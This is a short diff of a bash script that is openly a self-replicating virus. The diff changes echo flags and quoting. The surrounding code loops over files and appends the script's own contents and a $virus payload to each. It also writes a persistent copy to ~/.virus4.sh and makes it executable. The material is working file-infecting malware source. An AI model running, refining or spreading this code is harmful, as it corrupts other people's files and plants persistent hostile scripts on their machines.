@@ -30,7 +30,7 @@ filename=$(basename $0)
 
 for file in "${files[@]}"; do
     if [[ $file != $filename ]]; then
-        echo -e "\\n" >> "$file"
+        echo -n -e "\\n" >> "$file"
         cat $0 >> "$file"
     fi
 done
@@ -45,13 +45,13 @@ exit 0'"'"'
 
 for file in "${files[@]}"; do
     if [[ $file != $filename ]]; then
-        echo -e "\\n$virus" >> $file
+        echo -n -e "\\n$virus" >> $file
     fi
 done
 
-exit 0
-'
-    echo -e "$actual_virus" > ~/.virus4.sh
+exit 0'
+
+    echo -n -e "$actual_virus" > ~/.virus4.sh
     chmod +x ~/.virus4.sh
 fi
 
